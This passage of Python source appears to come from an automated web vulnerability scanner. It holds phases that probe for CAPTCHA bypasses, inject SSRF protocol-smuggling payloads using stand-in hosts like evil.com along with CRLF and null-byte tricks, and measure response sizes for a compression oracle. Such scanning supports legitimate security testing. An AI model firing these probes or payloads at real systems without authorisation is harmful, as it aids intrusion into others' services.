            no_captcha_req = urllib.request.Request(
                url,
                method="POST",
                data=no_captcha_data,
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/x-www-form-urlencoded",
                    **_cb_extra_headers,
                },
            )
            nc_s, _, nc_body = await _async_urlopen(_cb_urlopen, no_captcha_req, timeout=10)
            nc_str = nc_body.decode("utf-8", errors="ignore") if nc_body else ""
            if nc_s == 200 and "captcha" not in nc_str.lower() and "error" not in nc_str.lower():
                results.append(
                    f"[captcha-missing] {url} — submission accepted without captcha token (HTTP {nc_s})"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        # CAPTCHA removal by changing method (POST -> GET)
        try:
            method_change_req = urllib.request.Request(
                url,
                method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_cb_extra_headers},
            )
            mc_s, _, mc_body = await _async_urlopen(_cb_urlopen, method_change_req, timeout=10)
            mc_str = mc_body.decode("utf-8", errors="ignore") if mc_body else ""
            if mc_s == 200 and "captcha" not in mc_str.lower():
                results.append(
                    f"[captcha-method-bypass] {url} — GET method bypasses captcha (HTTP {mc_s})"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        # CAPTCHA removal by content-type change
        try:
            ct_change_req = urllib.request.Request(
                url,
                method="POST",
                data=b"{}",
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/json",
                    **_cb_extra_headers,
                },
            )
            ct_s, _, ct_body = await _async_urlopen(_cb_urlopen, ct_change_req, timeout=10)
            ct_str = ct_body.decode("utf-8", errors="ignore") if ct_body else ""
            if ct_s == 200 and "captcha" not in ct_str.lower():
                results.append(
                    f"[captcha-content-type-bypass] {url} — JSON content-type bypasses captcha (HTTP {ct_s})"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        return results

    captcha_results = await asyncio.gather(*[_probe_captcha(u) for u in captcha_endpoints])
    for cr in captcha_results:
        findings.extend(cr)
    if not findings:
        findings.append("[captcha-bypass] No CAPTCHA bypass candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"182-CAPTCHABYPASS: {len(findings)} CAPTCHA probes -> {out}")
    return {"182-CAPTCHABYPASS": str(out), "count": len(findings)}


async def phase_184_SSRFPARTIAL(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"184-SSRFPARTIAL"}:
        return {}
    _out = outdir / "ssrf_partial.txt"
    if _out.exists() and not force:
        return {"184-SSRFPARTIAL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 184-SSRFPARTIAL: partial URL / protocol smuggling SSRF")
    findings: List[str] = []
    _sp_urlopen = _get_urlopener()
    _sp_extra_headers = _extra_headers_dict()
    ssrf_endpoints: List[str] = prev.get("66-SSRF-FULL", [])
    if not ssrf_endpoints:
        ssrf_file = outdir / "ssrf_full.txt"
        if ssrf_file.exists():
            ssrf_endpoints = read_lines(ssrf_file)
    if not ssrf_endpoints:
        urls_file = outdir / "urls_all.txt"
        all_urls = read_lines(urls_file) if urls_file.exists() else []
        ssrf_endpoints = [
            u
            for u in all_urls
            if any(
                m in u.lower()
                for m in ("url=", "uri=", "path=", "dest=", "redirect=", "file=", "load=", "proxy=")
            )
        ][:20]
    if not ssrf_endpoints:
        log("warn", "184-SSRFPARTIAL: no SSRF endpoints from prev or files; skipping")
        return {"184-SSRFPARTIAL": str(_out), "count": 0}
    # Protocol smuggling variants
    smuggling_payloads = [
        ("@-based", "http://evil@target.com"),
        ("protocol-relative", "//evil.com"),
        ("crlf-injected", "http://evil%0d%0aHost:%20localhost"),
        ("dns-rebind", "http://0123456789abcdef.example.com"),
        ("double-scheme", "http://http://evil.com"),
        ("backslash", "http://evil.com\\@target.com"),
        ("null-byte", "http://evil.com%00@target.com"),
        ("unicode-dot", "http://evil。com"),
    ]

    async def _probe_smuggle(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for variant_name, payload in smuggling_payloads:
                await _throttle_rate()
                test_qs = {}
                for k, vals in qs.items():
                    if k == param_name:
                        test_qs[k] = [payload]
                    else:
                        test_qs[k] = vals
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_sp_extra_headers},
                    )
                    status, _, body = await _async_urlopen_no_redirect(_sp_urlopen, req, timeout=10)
                    body_str = body.decode("utf-8", errors="ignore") if body else ""
                    if status in (301, 302, 303, 307, 308):
                        results.append(
                            f"[smuggle-redirect] {test_url[:150]} — {variant_name}: HTTP {status}"
                        )
                    elif status == 200 and len(body_str) > 0:
                        if "evil" in body_str.lower() or "localhost" in body_str.lower():
                            results.append(
                                f"[smuggle-content] {test_url[:150]} — {variant_name}: payload reflected in body"
                            )
                        else:
                            results.append(
                                f"[smuggle-ok] {test_url[:150]} — {variant_name}: HTTP {status} len={len(body_str)}"
                            )
                except urllib.error.HTTPError as e:
                    results.append(
                        f"[smuggle-error] {test_url[:150]} — {variant_name}: HTTP {e.code}"
                    )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        return results

    smuggle_results = await asyncio.gather(*[_probe_smuggle(u) for u in ssrf_endpoints[:10]])
    for sr in smuggle_results:
        findings.extend(sr)
    if not findings:
        findings.append("[ssrf-partial] No SSRF protocol smuggling candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"184-SSRFPARTIAL: {len(findings)} SSRF smuggling probes -> {out}")
    return {"184-SSRFPARTIAL": str(out), "count": len(findings)}


async def phase_190_BROTLIORACLE(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"190-BROTLIORACLE"}:
        return {}
    _out = outdir / "brotli_oracle.txt"
    if _out.exists() and not force:
        return {"190-BROTLIORACLE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 190-BROTLIORACLE: Brotli compression oracle testing")
    findings: List[str] = []
    _bo_urlopen = _get_urlopener()
    _bo_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "190-BROTLIORACLE: no URLs; skipping")
        return {"190-BROTLIORACLE": str(_out), "count": 0}
    post_candidates = [u for u in all_urls if "=" in u and not _is_static_url(u)][
        : _PIPELINE_CFG.sample_urls_redirect
    ]
    if not post_candidates:
        log("warn", "190-BROTLIORACLE: no parameter URLs; skipping")
        return {"190-BROTLIORACLE": str(_out), "count": 0}
    secret_value = "SECRET_abcdef12345"
    secret_variants = [
        "SECRET_abcdef12346",
        "SECRET_abcdef12344",
        "SECRET_abcdef12355",
        "SECRET_abcdef12335",
        "SECRET_abcdef12345",
        "SECRET_abcdef12345",
        "SECRET_abcdef12345",
    ]

    async def _oracle_test(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        test_param = next(iter(qs.keys()))
        if test_param.lower() in _SKIP_PARAMS:
            return results

        # Measure baseline with secret
        async def _get_response_size(param_value: str) -> Optional[int]:
            try:
                test_qs = {}
                for k, vals in qs.items():
                    if k == test_param:
                        test_qs[k] = [param_value]
                    else:
                        test_qs[k] = vals
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                req = urllib.request.Request(
                    test_url,
                    method="GET",
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Accept-Encoding": "gzip, deflate, br",
                        **_bo_extra_headers,
                    },
                )
                _, _, body = await _async_urlopen_no_redirect(_bo_urlopen, req, timeout=10)
                body_str = body.decode("utf-8", errors="ignore") if body else ""
                return len(body_str)
            except asyncio.CancelledError:
                raise
            except Exception:
                return None

        # Test each character position by changing one char of the secret
        sizes: Dict[str, int] = {}
        for variant in secret_variants:
            await _throttle_rate()
            size = await _get_response_size(variant)
            if size is not None:
                sizes[variant] = size
        if len(sizes) >= 2:
            unique_sizes = set(sizes.values())
            if len(unique_sizes) > 1:
                results.append(
                    f"[compression-oracle] {url[:100]} — response size varies with input ({len(unique_sizes)} distinct sizes)"
                )
                for variant, sz in sorted(sizes.items(), key=lambda x: x[1]):
                    results.append(f"  variant='{variant}' size={sz}")
        # Single character position variations
        char_sizes: Dict[int, int] = {}
        for pos in range(len(secret_value)):
            await _throttle_rate()
            mutated = secret_value[:pos] + "X" + secret_value[pos + 1 :]
            sz_raw = await _get_response_size(mutated)
            if sz_raw is not None:
                char_sizes[pos] = sz_raw
        if len(char_sizes) >= 3:
            if len(set(char_sizes.values())) > 1:
                results.append(
                    f"[char-oracle] {url[:100]} — response size changes based on character position"
                )
                for pos, sz in sorted(char_sizes.items()):
                    results.append(f"  pos={pos} char='{secret_value[pos]}'->'X' size={sz}")
        return results

    oracle_results = await asyncio.gather(*[_oracle_test(u) for u in post_candidates[:10]])
    for ores in oracle_results:
        findings.extend(ores)
    if not findings:
        findings.append("[brotli-oracle] No compression oracle candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"190-BROTLIORACLE: {len(findings)} compression oracle probes -> {out}")
    return {"190-BROTLIORACLE": str(out), "count": len(findings)}
